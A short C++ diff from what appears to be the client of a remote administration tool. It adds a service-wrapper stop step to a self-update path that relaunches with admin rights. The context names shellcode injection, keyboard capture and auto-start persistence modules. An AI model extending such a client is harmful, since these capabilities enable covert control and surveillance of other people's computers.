@@ -18,6 +18,9 @@
 #include "auto_start.h"
 #include "ShellcodeInj.h"
 #include "KeyboardManager.h"
+extern "C" {
+#include "ServiceWrapper.h"
+}
 
 #pragma comment(lib, "urlmon.lib")
 
@@ -998,6 +1001,9 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
                 break;
             }
             if (IsPowerShellAvailable() && StartAdminLauncherAndExit(curFile, false)) {
+#if _CONSOLE
+                if (m_conn->iStartup == Startup_GhostMsc) ServiceWrapper_Stop();
+#endif
                 g_bExit = S_CLIENT_UPDATE;
                 Mprintf("CKernelManager: [%s] Will be executed.\n", curFile);
                 Sleep(1000);
